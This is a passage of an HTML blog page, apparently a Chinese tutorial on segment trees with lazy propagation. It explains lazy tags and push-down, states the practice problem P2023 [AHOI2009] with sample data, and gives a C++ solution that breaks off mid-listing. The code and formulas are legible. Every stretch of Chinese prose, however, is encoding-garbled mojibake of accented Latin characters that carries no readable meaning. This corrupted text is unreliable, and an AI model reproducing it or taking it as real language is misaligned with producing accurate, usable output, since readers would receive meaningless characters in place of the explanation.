src="/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/segt1.svg"></p><p>å›¾ä¸­æ¯ä¸ªèŠ‚ç‚¹ä¸­ç”¨çº¢è‰²å­—ä½“æ ‡æ˜çš„åŒºé—´ï¼Œè¡¨ç¤ºè¯¥èŠ‚ç‚¹ç®¡è¾–çš„ $a$ æ•°ç»„ä¸Šçš„ä½ç½®åŒºé—´ã€‚å¦‚ $d_1$ æ‰€ç®¡è¾–çš„åŒºé—´å°±æ˜¯ $[1,5]$ï¼ˆ$a_1,a_2, \cdots ,a_5$ï¼‰ï¼Œå³ $d_1$ æ‰€ä¿å­˜çš„å€¼æ˜¯ $a_1+a_2+ \cdots +a_5$ï¼Œ$d_1=60$ è¡¨ç¤ºçš„æ˜¯ $a_1+a_2+ \cdots +a_5=60$ã€‚</p><p>é€šè¿‡è§‚å¯Ÿä¸éš¾å‘ç°ï¼Œ$d_i$ çš„å·¦å„¿å­èŠ‚ç‚¹å°±æ˜¯ $d_{2\times i}$ï¼Œ$d_i$ çš„å³å„¿å­èŠ‚ç‚¹å°±æ˜¯ $d_{2\times i+1}$ã€‚å¦‚æœ $d_i$ è¡¨ç¤ºçš„æ˜¯åŒºé—´ $[s,t]$ï¼ˆå³ $d_i=a_s+a_{s+1}+ \cdots +a_t$) çš„è¯ï¼Œé‚£ä¹ˆ $d_i$ çš„å·¦å„¿å­èŠ‚ç‚¹è¡¨ç¤ºçš„æ˜¯åŒºé—´ $[ s, \frac{s+t}{2} ]$ï¼Œ$d_i$ çš„å³å„¿å­è¡¨ç¤ºçš„æ˜¯åŒºé—´ $[ \frac{s+t}{2} +1,t ]$ã€‚</p><p>åœ¨å®ç°æ—¶ï¼Œæˆ‘ä»¬è€ƒè™‘é€’å½’å»ºæ ‘ã€‚è®¾å½“å‰çš„æ ¹èŠ‚ç‚¹ä¸º $p$ï¼Œå¦‚æœæ ¹èŠ‚ç‚¹ç®¡è¾–çš„åŒºé—´é•¿åº¦å·²ç»æ˜¯ $1$ï¼Œåˆ™å¯ä»¥ç›´æ¥æ ¹æ® $a$ æ•°ç»„ä¸Šç›¸åº”ä½ç½®çš„å€¼åˆå§‹åŒ–è¯¥èŠ‚ç‚¹ã€‚å¦åˆ™æˆ‘ä»¬å°†è¯¥åŒºé—´ä»ä¸­ç‚¹å¤„åˆ†å‰²ä¸ºä¸¤ä¸ªå­åŒºé—´ï¼Œåˆ†åˆ«è¿›å…¥å·¦å³å­èŠ‚ç‚¹é€’å½’å»ºæ ‘ï¼Œæœ€ååˆå¹¶ä¸¤ä¸ªå­èŠ‚ç‚¹çš„ä¿¡æ¯ã€‚ï¼ˆä»¥ä¸Šæ¥è‡ªwikiï¼‰</p><p>åœ¨è¿›è¡ŒåŒºé—´æ“ä½œçš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¸ä¼šæŠŠçŠ¶æ€æ›´æ–°åˆ°æ¯ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœæ›´æ–°ï¼Œé‚£ä¹ˆä¸€æ¬¡æ“ä½œæœ€å¤§çš„å¤æ‚åº¦ä¼šæ˜¯ $O(n)$ã€‚å› æ­¤æˆ‘ä»¬ä¼šé‡‡å–æ‡’æƒ°æ ‡è®°çš„æ–¹å¼å»è®°å½•è¿™æ¬¡çš„æ“ä½œï¼Œå¦‚æœè¿™æ¬¡æ›´æ–°å®Œæ•´åœ°åŒ…å«äº†ä¸€ä¸ªåŒºé—´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯¹è¿™ä¸ªåŒºé—´æ‰“ä¸Šæ‡’æƒ°æ ‡è®°ï¼Œä¸ç»§ç»­å¾€ä¸‹æ›´æ–°ï¼Œè‹¥è¦æŸ¥è¯¢ï¼Œåˆ™ä¼šå°†æ‡’æƒ°æ ‡è®°åŠ åˆ°å¯¹åº”çš„èŠ‚ç‚¹ä¸Šå»ã€‚å¯ä»¥è¯æ˜ï¼Œæ¯ä¸€æ¬¡æ“ä½œä¸ä¼šè¶…è¿‡4ä¸ªåŒºé—´ï¼ŒåŠ ä¸ŠåŒºé—´æ“ä½œæ˜¯ä»ä¸Šå¾€ä¸‹å»¶çš„ï¼Œé‚£ä¹ˆä¸€æ¬¡æ“ä½œç†è®ºæœ€åçš„æƒ…å†µåº”è¯¥æ˜¯ $O(log_2n)$ï¼Œéå¸¸ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ã€‚æŸ¥è¯¢å¤æ‚åº¦åŒç†ï¼Œä¹Ÿæ˜¯ $O(log_2n)$ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„å‡ ç‚¹ï¼š</p><h2 id="æ‡’æƒ°æ ‡è®°æ€ä¹ˆæ‰“ï¼Ÿ"><a href="#æ‡’æƒ°æ ‡è®°æ€ä¹ˆæ‰“ï¼Ÿ" class="headerlink" title="æ‡’æƒ°æ ‡è®°æ€ä¹ˆæ‰“ï¼Ÿ"></a>æ‡’æƒ°æ ‡è®°æ€ä¹ˆæ‰“ï¼Ÿ</h2><p>å½“å½“å‰åŒºé—´å®Œå…¨åŒ…å«äºæˆ‘è¦æ“ä½œçš„åŒºé—´ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½ä¼šæœ‰ç‚¹ç–‘é—®ï¼Œè¿™ä¸ªåŒºé—´çš„å€¼æˆ‘æ˜¯åŠ æˆ–è€…ä¸åŠ ï¼Œæˆ‘çš„æ‡’æƒ°æ ‡è®°è‚¯å®šä¼šç»™åˆ°è¿™ä¸ªåŒºé—´ï¼Œä½†æ˜¯è¿™ä¸ªå€¼åŠ ä¸åŠ ï¼Œæ‡’æƒ°æ ‡è®°ç»™åˆ°äº†ï¼Œé‚£ä¹ˆä¸€ä¸ªåŒºé—´å¸¦äº†ä¸€ä¸ªæ‡’æƒ°æ ‡è®°ï¼Œå®ƒçš„å€¼åˆ°åº•æ˜¯æ„å‘³ç€åŠ äº†è¿˜æ˜¯æ²¡åŠ å‘¢ï¼Ÿå› ä¸ºæ„Ÿè§‰ç†è®ºä¸Šå¥½åƒéƒ½å¯è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œå®é™…æƒ…å†µæ˜¯ï¼šè¦åŠ ï¼å› ä¸ºæˆ‘åŒºé—´çš„å€¼ä¼šè¢«æ›´æ–°åˆ°çˆ¶äº²èŠ‚ç‚¹ï¼Œå¦‚æœæˆ‘ä¸åŠ ï¼Œé‚£ä¹ˆæ›´æ–°ä¸Šå»çš„èŠ‚ç‚¹å€¼å°±æ˜¯é”™è¯¯çš„ã€‚å› æ­¤æ­¤æ—¶æˆ‘ä¸€å®šè¦æŠŠå€¼åŠ ä¸Šå»ã€‚é‚£ä¹ˆä¸€ä¸ªåŒºé—´å¸¦äº†æ‡’æƒ°æ ‡è®°å®ƒçš„å«ä¹‰æ˜¯ï¼šæˆ‘è‡ªå·±çš„å€¼å·²ç»åŠ ä¸Šå»äº†ï¼Œä½†æ˜¯æˆ‘çš„å„¿å­åŒºé—´å’Œå­™å­ï¼Œæ›¾å­™å­åŒºé—´éƒ½æ²¡åŠ ä¸Šè¿™ä¸ªå€¼ï¼Œç­‰ä¼šè¿‡æ¥çš„æ—¶å€™éƒ½éœ€è¦åŠ ä¸Šï¼Œé‚£ä¹ˆå¸¦äº†æ‡’æƒ°æ ‡è®°çš„é‚£ä¸ªåŒºé—´æ˜¯å·²ç»åŠ ä¸Šäº†çš„ã€‚</p><p>æ‰€ä»¥æ‡’æƒ°æ ‡è®°ä»€ä¹ˆå«ä¹‰ä¸€å®šè¦ææ¸…æ¥šï¼Œä¸èƒ½æ¨¡æ£±ä¸¤å¯ï¼Œä¸èƒ½ï¼Œä¸èƒ½ï¼ï¼ï¼</p><h2 id="ä»€ä¹ˆæ—¶å€™push-down"><a href="#ä»€ä¹ˆæ—¶å€™push-down" class="headerlink" title="ä»€ä¹ˆæ—¶å€™push down"></a>ä»€ä¹ˆæ—¶å€™push down</h2><p>æ‡’æƒ°æ ‡è®°ä¸‹ä¼ çš„æ“ä½œæˆ‘ä»¬å« <code>push_down</code>ã€‚ä»€ä¹ˆæ—¶å€™éœ€è¦å‘¢ï¼Ÿæˆ‘ä»¬ç†è§£äº†æ‡’æƒ°æ ‡è®°çš„å«ä¹‰ä¹‹åï¼Œæˆ‘ä»¬å°±æ¸…æ¥šäº†ï¼Œå¸¦äº†æ‡’æƒ°æ ‡è®°çš„åŒºé—´ï¼Œæœ¬èº«å·²ç»åŠ ä¸Šäº†å€¼ï¼Œåªæ˜¯å„¿å­éƒ½æ²¡åŠ ä¸Šå»ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ç›´æ¥å†å¯¹æ•´ä¸ªåŒºé—´æ“ä½œï¼Œéœ€ä¸éœ€è¦ <code>push_down</code> å‘¢ï¼Ÿä¸éœ€è¦ï¼Œå› ä¸ºè¿™ä¸ªåŒºé—´å·²ç»æ˜¯çœŸå®å€¼äº†ï¼Œä½†æ˜¯æˆ‘åœ¨å¯¹ä¸€ä¸ªå¸¦æœ‰æ‡’æƒ°æ ‡è®°çš„åŒºé—´çš„å„¿å­åŒºé—´å°è¯•è¿›è¡Œæ“ä½œçš„æ—¶å€™å‘¢ï¼Ÿé‚£è‚¯å®šéœ€è¦äº†ï¼å› ä¸ºå„¿å­åŒºé—´è¿˜ä¸æ˜¯çœŸå®å€¼ï¼Œè¿˜å¾—åŠ ä¸Šçˆ¶äº²ç»™å®ƒçš„æ‡’æƒ°æ ‡è®°æ‰æ˜¯ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ <code>push_down</code> ä¸€æ¬¡å°±ä¼šæŠŠä¸€ä¸ªåŒºé—´çš„æ‡’æƒ°æ ‡è®°æ¸…é›¶ï¼Œç»™å¯¹åº”çš„ä¸¤ä¸ªå„¿å­åŒºé—´åŠ ä¸Šå¯¹åº”çš„å€¼ï¼Œå¹¶æŠŠæ‡’æƒ°æ ‡è®°åˆ†å‘ç»™ä»–ä»¬ã€‚</p><h1 id="ç»ƒä¹ é¢˜"><a href="#ç»ƒä¹ é¢˜" class="headerlink" title="ç»ƒä¹ é¢˜"></a>ç»ƒä¹ é¢˜</h1><h2 id="P2023-AHOI2009-ç»´æŠ¤åºåˆ—"><a href="#P2023-AHOI2009-ç»´æŠ¤åºåˆ—" class="headerlink" title="P2023 [AHOI2009] ç»´æŠ¤åºåˆ—"></a>P2023 [AHOI2009] ç»´æŠ¤åºåˆ—</h2><h3 id="é¢˜ç›®èƒŒæ™¯"><a href="#é¢˜ç›®èƒŒæ™¯" class="headerlink" title="é¢˜ç›®èƒŒæ™¯"></a>é¢˜ç›®èƒŒæ™¯</h3><p>è€å¸ˆäº¤ç»™å°å¯å¯ä¸€ä¸ªç»´æŠ¤æ•°åˆ—çš„ä»»åŠ¡ï¼Œç°åœ¨å°å¯å¯å¸Œæœ›ä½ æ¥å¸®ä»–å®Œæˆã€‚</p><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>æœ‰ä¸€ä¸ªé•¿ä¸º $n$ çš„æ•°åˆ— ${a_n}$ï¼Œæœ‰å¦‚ä¸‹ä¸‰ç§æ“ä½œå½¢å¼ï¼š</p><ol><li>æ ¼å¼ <code>1 t g c</code>ï¼Œè¡¨ç¤ºæŠŠæ‰€æœ‰æ»¡è¶³ $t\le i\le g$ çš„ $a_i$ æ”¹ä¸º $a_i\times c$ ;</li><li>æ ¼å¼ <code>2 t g c</code> è¡¨ç¤ºæŠŠæ‰€æœ‰æ»¡è¶³ $t\le i\le g$ çš„ $a_i$ æ”¹ä¸º $a_i+c$ ;</li><li>æ ¼å¼ <code>3 t g</code> è¯¢é—®æ‰€æœ‰æ»¡è¶³ $t\le i\le g$ çš„ $a_i$ çš„å’Œï¼Œç”±äºç­”æ¡ˆå¯èƒ½å¾ˆå¤§ï¼Œä½ åªéœ€è¾“å‡ºè¿™ä¸ªæ•°æ¨¡ $p$ çš„å€¼ã€‚</li></ol><h3 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h3><p>ç¬¬ä¸€è¡Œä¸¤ä¸ªæ•´æ•° $n$ å’Œ $p$ã€‚</p><p>ç¬¬äºŒè¡Œå«æœ‰ $n$ ä¸ªéè´Ÿæ•´æ•°ï¼Œè¡¨ç¤ºæ•°åˆ— ${a_i}$ ã€‚</p><p>ç¬¬ä¸‰è¡Œæœ‰ä¸€ä¸ªæ•´æ•° $m$ï¼Œè¡¨ç¤ºæ“ä½œæ€»æ•°ã€‚</p><p>ä»ç¬¬å››è¡Œå¼€å§‹æ¯è¡Œæè¿°ä¸€ä¸ªæ“ä½œï¼ŒåŒä¸€è¡Œç›¸é‚»ä¸¤æ•°ä¹‹é—´ç”¨ä¸€ä¸ªç©ºæ ¼éš”å¼€ï¼Œæ¯è¡Œå¼€å¤´å’Œæœ«å°¾æ²¡æœ‰å¤šä½™ç©ºæ ¼ã€‚</p><h3 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h3><p>å¯¹æ¯ä¸ªæ“ä½œ 3ï¼ŒæŒ‰ç…§å®ƒåœ¨è¾“å…¥ä¸­å‡ºç°çš„é¡ºåºï¼Œä¾æ¬¡è¾“å‡º<strong>ä¸€è¡Œä¸€ä¸ªæ•´æ•°</strong>è¡¨ç¤ºè¯¢é—®ç»“æœã€‚</p><h3 id="æ ·ä¾‹-1"><a href="#æ ·ä¾‹-1" class="headerlink" title="æ ·ä¾‹ #1"></a>æ ·ä¾‹ #1</h3><h4 id="æ ·ä¾‹è¾“å…¥-1"><a href="#æ ·ä¾‹è¾“å…¥-1" class="headerlink" title="æ ·ä¾‹è¾“å…¥ #1"></a>æ ·ä¾‹è¾“å…¥ #1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">7 43</span><br><span class="line">1 2 3 4 5 6 7</span><br><span class="line">5</span><br><span class="line">1 2 5 5</span><br><span class="line">3 2 4</span><br><span class="line">2 3 7 9</span><br><span class="line">3 1 3</span><br><span class="line">3 4 7</span><br></pre></td></tr></table></figure><h4 id="æ ·ä¾‹è¾“å‡º-1"><a href="#æ ·ä¾‹è¾“å‡º-1" class="headerlink" title="æ ·ä¾‹è¾“å‡º #1"></a>æ ·ä¾‹è¾“å‡º #1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">35</span><br><span class="line">8</span><br></pre></td></tr></table></figure><h3 id="æç¤º"><a href="#æç¤º" class="headerlink" title="æç¤º"></a>æç¤º</h3><h4 id="æ ·ä¾‹è¾“å…¥è¾“å‡º-1-è§£é‡Š"><a href="#æ ·ä¾‹è¾“å…¥è¾“å‡º-1-è§£é‡Š" class="headerlink" title="æ ·ä¾‹è¾“å…¥è¾“å‡º 1 è§£é‡Š"></a>æ ·ä¾‹è¾“å…¥è¾“å‡º 1 è§£é‡Š</h4><ul><li>åˆå§‹æ—¶æ•°åˆ—ä¸º ${1,2,3,4,5,6,7}$ã€‚</li><li>ç»è¿‡ç¬¬ $1$ æ¬¡æ“ä½œåï¼Œæ•°åˆ—ä¸º ${1,10,15,20,25,6,7}$ã€‚</li><li>å¯¹ç¬¬ $2$ æ¬¡æ“ä½œï¼Œå’Œä¸º $10+15+20=45$ï¼Œæ¨¡ $43$ çš„ç»“æœæ˜¯ $2$ã€‚</li><li>ç»è¿‡ç¬¬ $3$ æ¬¡æ“ä½œåï¼Œæ•°åˆ—ä¸º ${1,10,24,29,34,15,16}$ã€‚</li><li>å¯¹ç¬¬ $4$ æ¬¡æ“ä½œï¼Œå’Œä¸º $1+10+24=35$ï¼Œæ¨¡ $43$ çš„ç»“æœæ˜¯ $35$ã€‚</li><li>å¯¹ç¬¬ $5$ æ¬¡æ“ä½œï¼Œå’Œä¸º $29+34+15+16=94$ï¼Œæ¨¡ $43$ çš„ç»“æœæ˜¯$8$ã€‚</li></ul><h4 id="æ•°æ®è§„æ¨¡ä¸çº¦å®š"><a href="#æ•°æ®è§„æ¨¡ä¸çº¦å®š" class="headerlink" title="æ•°æ®è§„æ¨¡ä¸çº¦å®š"></a>æ•°æ®è§„æ¨¡ä¸çº¦å®š</h4><p>æµ‹è¯•æ•°æ®è§„æ¨¡å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p><table><thead><tr><th align="center">æ•°æ®ç‚¹ç¼–å·</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9,10</th></tr></thead><tbody><tr><td align="center">$n=$</td><td align="center">$10$</td><td align="center">$1000$</td><td align="center">$1000$</td><td align="center">$10000$</td><td align="center">$60000$</td><td align="center">$70000$</td><td align="center">$80000$</td><td align="center">$90000$</td><td align="center">$100000$</td></tr><tr><td align="center">$m=$</td><td align="center">$10$</td><td align="center">$1000$</td><td align="center">$1000$</td><td align="center">$10000$</td><td align="center">$60000$</td><td align="center">$70000$</td><td align="center">$80000$</td><td align="center">$90000$</td><td align="center">$100000$</td></tr></tbody></table><p>å¯¹äºå…¨éƒ¨çš„æµ‹è¯•ç‚¹ï¼Œä¿è¯ $0 \leq p, a_i, c \leq 10^9$ï¼Œ$1 \leq t \leq g \leq n$ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ˜¯ä¸€ä¸ªçº¿æ®µæ ‘çš„ç¿»ç‰ˆé¢˜ï¼Œåªä¸è¿‡è¦å–æ¨¡ï¼Œå¹¶ä¸”æœ‰ä¹˜æ³•ï¼Œä¹˜æ³•å…¶å®è·ŸåŠ æ³•ä¸€æ ·ï¼Œå¦‚æœåŒºé—´é‡Œçš„æ•°éƒ½ä¹˜ä¸Šä¸€ä¸ªæ•°ï¼Œé‚£ä¹ˆå…¶å®å°±ç›¸å½“äºå…ˆå’Œå†ä¹˜ï¼Œä¹˜æ³•æ‡’æƒ°æ ‡è®°é»˜è®¤åº”è¯¥ä¸º1ã€‚å› ä¸ºæ—¢æœ‰åŠ æ³•ä¹Ÿæœ‰ä¹˜æ³•ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸¤ä¸ªæ‡’æƒ°æ ‡è®°ï¼Œå½“æ‡’æƒ°æ ‡è®°ä¹˜ä¸Šå»æ—¶ï¼ŒåŠ æ³•çš„æ‡’æƒ°æ ‡è®°åº”è¯¥å¯¹åº”è¦ä¹˜ä¸Šå»ï¼Œåœ¨push_downçš„æ—¶å€™ï¼Œæˆ‘ä»¬å…ˆä¹˜ï¼Œå†åŠ å³å¯ã€‚</p><h2 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> n,p;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> lazy1;</span><br><span class="line">    <span class="keyword">int</span> lazy2;</span><br><span class="line">&#125;tree[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    tree[now].l=l;</span><br><span class="line">    tree[now].r=r;</span><br><span class="line">    tree[now].lazy1=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        tree[now].sum=a[r];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(now&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">    <span class="built_in">build</span>(now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    tree[now].sum=(tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum)%p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_lazy</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> lazy1,<span class="keyword">int</span> lazy2)</span></span>&#123;</span><br><span class="line">    tree[i].sum*=lazy1;</span><br><span class="line">    tree[i].sum%=p;</span><br><span class="line">    tree[i].sum+=(tree[i].r-tree[i].l+<span class="number">1</span>)*lazy2;</span><br><span class="line">    tree[i].sum%=p;</span><br><span class="line">    tree[i].lazy1*=lazy1;</span><br><span class="line">    tree[i].lazy2*=lazy1;</span><br><span class="line">    tree[i].lazy1%=p;</span><br><span class="line">    tree[i].lazy2%=p;</span><br><span class="line">    tree[i].lazy2+=lazy2;</span><br><span class="line">    tree[i].lazy2%=p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_down</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lazy1=tree[i].lazy1,lazy2=tree[i].lazy2;</span><br><span class="line">    tree[i].lazy1=<span class="number">1</span>;</span><br><span class="line">    tree[i].lazy2=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">add_lazy</span>(i&lt;&lt;<span class="number">1</span>,lazy1,lazy2);</span><br><span class="line">    <span class="built_in">add_lazy</span>(i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,lazy1,lazy2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;query(%lld,%lld,%lld)\n&quot;,l,r,now);</span></span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        ans+=tree[now].sum;</span><br><span class="line">        <span class="comment">//printf(&quot;sum=%d\n&quot;,tree[now].sum);</span></span><br><span class="line">        ans%=p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].l+tree[now].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">query</span>(l,r,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">query</span>(l,r,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        <span class="built_in">add_lazy</span>(now,<span class="number">1</span>,num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].l+tree[now].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">add</span>(l,r,num,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">add</span>(l,r,num,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        <span class="built_in">add_lazy</span>(now,num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].r+tree[now].l&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">mul</span>(l,r,num,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">mul</span>(l,r,num,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 